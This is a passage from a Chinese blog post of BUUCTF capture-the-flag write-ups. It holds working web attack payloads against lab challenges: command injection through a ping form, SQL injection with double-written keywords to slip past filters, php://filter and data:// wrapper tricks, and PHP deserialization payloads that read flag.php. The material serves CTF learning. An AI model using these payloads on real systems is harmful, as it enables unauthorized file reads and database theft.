<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name &#x3D; &quot;1&quot;;</span><br><span class="line">    public $age &#x3D; 0;</span><br><span class="line">    public $blog &#x3D; &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name &#x3D; $name;</span><br><span class="line">        $this-&gt;age &#x3D; (int)$age;</span><br><span class="line">        $this-&gt;blog &#x3D; $blog;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**&#x2F;union&#x2F;**&#x2F;select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>

<p>发现页面并没有回显，查看源码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623121553540.png" alt="image-20200623121553540"></p>
<p>在iframe标签中可以看到flag，复制提交就可以</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623121724839.png" alt="image-20200623121724839"></p>
<h3 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h3><p>打开页面</p>
<p>可以看到，是一个ping地址的，这里就可以第一时间想到127.0.0.1;ls 或者将分号改为|管道命令，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623145137116.png" alt="image-20200623145137116"></p>
<p>使用<code>127.0.0.1;ls</code>，发现页面返回index.php，说明命令有效，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623145521140.png" alt="image-20200623145521140"></p>
<p>使用cat查看flag看看，经过测试<code>127.0.0.1;cat flag.php</code>和<code>127.0.0.1;cat flag.txt</code>都没有，这里在尝试<code>127.0.0.1;cat 、flag</code>发现成功返回了flag，复制提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623145715604.png" alt="image-20200623145715604"></p>
<h3 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h3><p>不会，</p>
<h3 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h3><p>查看页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704151332056.png" alt="image-20200704151332056"></p>
<p>使用admin，admin看看能不能登录上</p>
<p>页面返回用户名密码错误，而且可以看到输入的内容在url中显示，在结合题目，尝试一下有没有sql注入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704151616984.png" alt="image-20200704151616984"></p>
<p>使用万能单引号，可以看到页面返回了错误，说明存在sql注入，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704151737736.png" alt="image-20200704151737736"></p>
<p>使用注释符看看页面能否返回正常，这里使用#号–号都被注释了不能使用，%23可以使用</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704151828372.png" alt="image-20200704151828372"></p>
<p>进行注入测试，查看注入点</p>
<p>可以看到使用order by的时候or被过滤了，我们尝试一下将or双写</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152017864.png" alt="image-20200704152017864"></p>
<p>可以看到虽然双写绕过了但是还是报错不能查看注入点，使用联合查看，测试注入点</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152112746.png" alt="image-20200704152112746"></p>
<p>发现页面将union select给过滤了，我们继续进行双写</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152205359.png" alt="image-20200704152205359"></p>
<p>可以看到双写可以绕过，页面返回了不同列数，说明当前列数不对</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152322218.png" alt="image-20200704152322218"></p>
<p>经过测试发现当列数时3的时候页面返回正常，这样知道了注入点就可以进行注入了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152456577.png" alt="image-20200704152456577"></p>
<p>查看当前数据库</p>
<p>payload：<code>?username=admin&amp;password=admin&#39; ununionion seselectlect 1,2,database()%23</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152543535.png" alt="image-20200704152543535"></p>
<p>知道数据库了查看表名，可以看到报错了，在information的地方，但是or已经双写了，所以猜测将from给过滤了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152706908.png" alt="image-20200704152706908"></p>
<p>将from进行双写，双写后发现还报错了，这次报错位置在=等于号前，因为前面的table和schema都没有过滤，所以确定where过滤了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152820412.png" alt="image-20200704152820412"></p>
<p>再次将where双写试试，这次终于成功的返回了表名，’b4bsql,geekuser’</p>
<p>payload：<code>?username=admin&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(table_name)frfromom infoorrmation_schema.tables whwhereere</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152946936.png" alt="image-20200704152946936"></p>
<p>知道表名了，查看字段，测试一下b4bsql表</p>
<p>payload：<code>?username=admin
&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(column_name)frfromom infoorrmation_schema.columns whwhereere table_name=&#39;b4bsql&#39;%23</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704153426029.png" alt="image-20200704153426029"></p>
<p>查看username字段的内容，可以看到有一个flag的用户名，我们查看一下密码，看看该用户名对应的是不是falg信息</p>
<p>payload：<code>?username=admin
&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(username)frfromom b4bsql%23</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704153518638.png" alt="image-20200704153518638"></p>
<p>发现成功返回了flag，如果现实不全可以查看源码进行复制</p>
<p>payload：<code>?username=admin
&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(password)frfromom b4bsql%23</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704153720139.png" alt="image-20200704153720139"></p>
<h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><p>查看页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704162008606.png" alt="image-20200704162008606"></p>
<p><strong>第一个绕过</strong></p>
<p><code>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))</code></p>
<p>需要让$text输入 ”welcome to the zjctf“ 传入文件中才能进行后面的步骤， 这里可以用php://input伪协议在以POST形式传入“ welcome to the zjctf “  也可以用data伪协议传参</p>
<p>payload：<code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></p>
<p>当页面返回这个的时候就说明正确</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704203423964.png" alt="image-20200704203423964"></p>
<p><strong>第二个绕过</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;</span><br><span class="line">    echo &quot;Not now!&quot;;</span><br><span class="line">    exit(); </span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    include($file); &#x2F;&#x2F;useless.php</span><br><span class="line">    $password &#x3D; unserialize($password);</span><br><span class="line">    echo $password;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有file参数可控，但是无法直接读取flag，可以直接读取/etc/passwd，但针对php文件我们需要进行base64编码，否则读取不到其内容，所以以下无法使用：</p>
<p><code>?file=useless.php</code></p>
<p>所以下面采用filter来读源码，但上面提到过针对php文件需要base64编码，所以使用其自带的base64过滤器。</p>
<p><code>file=php://filter/read=convert.base64-encode/resource=useless.php</code></p>
<p>跟第一个绕过放一起就是</p>
<p>payload：<code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></p>
<p>使用base64在线解码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704204528471.png" alt="image-20200704204528471"></p>
<p>解码之后得到以下值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  &#x2F;&#x2F;flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>构造序列化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class Flag&#123;  </span><br><span class="line">    public $file&#x3D;&quot;flag.php&quot;;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new Flag();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;  </span><br><span class="line"></span><br><span class="line">输出 O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>构造最后payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>页面返回这个</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704205638988.png" alt="image-20200704205638988"></p>
<p>按F12在源码中</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704205709535.png" alt="image-20200704205709535"></p>

      
    </div>
    
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2020/07/25/CTF%E8%B5%9B%E5%89%8D%E5%9F%B9%E8%AE%AD____%E6%9D%82%E9%A1%B9/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">&lt;</strong>
      <div class="article-nav-title">
        
          CTF赛前培训____杂项
        
      </div>
    </a>
  
  
    <a href="/2020/07/25/PCCTF/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">PCCTF</div>
      <strong class="article-nav-caption">&gt;</strong>
    </a>
  
</nav>

  
</article>


<div class="ds-share share" data-thread-key="BUUCTF题" data-title="BUUCTF题" data-url="https://zhanqiaozai.github.io/2020/07/25/BUUCTF%E9%A2%98/"  data-images="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" data-content="BUUCTF题">
    <div class="ds-share-inline">
      <ul  class="ds-share-icons-16">
      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
      </ul>
      <div class="ds-share-icons-more">
      </div>
    </div>
 </div>
 





</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2020 zhanqiaozai
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: false,
		isPost: true,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
</body>
</html>